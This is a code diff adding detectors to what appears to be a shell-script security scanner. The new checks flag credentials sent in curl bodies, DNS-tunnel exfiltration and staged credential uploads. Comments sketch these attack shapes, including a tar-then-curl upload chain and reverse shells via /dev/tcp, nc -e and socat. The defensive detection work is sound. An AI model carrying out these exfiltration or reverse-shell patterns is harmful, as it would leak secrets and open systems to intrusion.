+    # the shell twin of Python's ENV_EXFIL_FLOW. "info" severity -> WARN (routed into the
+    # warns_env_exfil bucket in checks/_vet.py, never FAIL): a body credential is
+    # ambiguous (an OAuth token endpoint legitimately posts client_secret to its own
+    # provider), exactly the warns_env_exfil "confirm the destination is first-party" case.
+    for i in sorted(_sh_cred_env_in_body_lines(masked)):
+        add(
+            "SHELL_ENV_BODY_EXFIL",
+            "info",
+            i,
+            "a credential-shaped environment variable is sent in a curl request body "
+            "(-d/--data/--form) \u2014 confirm the destination is a trusted first-party API, "
+            "not an attacker-controlled host",
+        )
+
+    # B-1063: a credential encoded into a DNS lookup's query name (dig/nslookup/host ...
+    # base64(secret).attacker) -- DNS-tunnel exfiltration. "info" -> WARN (warns_env_exfil).
+    for i in sorted(_sh_dns_cred_exfil_lines(masked)):
+        add(
+            "SHELL_DNS_EXFIL",
+            "info",
+            i,
+            "an encoded credential is placed in a DNS lookup's query name "
+            "(dig/nslookup/host) \u2014 possible DNS-tunnel exfiltration; confirm the queried "
+            "name is not carrying secret data off-box",
+        )
+
+    # B-1066: a credential file laundered through a temp copy/archive and then uploaded
+    # (cp cred /tmp/x; tar czf /tmp/a.tgz /tmp/x; curl -T /tmp/a.tgz host). "info" -> WARN.
+    for i in sorted(_sh_staged_cred_upload_lines(masked)):
+        add(
+            "SHELL_STAGED_CRED_UPLOAD",
+            "info",
+            i,
+            "uploads a file whose content was copied/archived from a credential file "
+            "earlier in this script \u2014 possible staged exfiltration; confirm the "
+            "destination is a trusted first-party backup, not an attacker-controlled host",
+        )
 
     # C-630: plaintext reverse shell (bash /dev/tcp, nc -e, socat exec:, fd-bound shell).
     for _rs_ln, _rs_shape in _sh_reverse_shell_lines(masked):
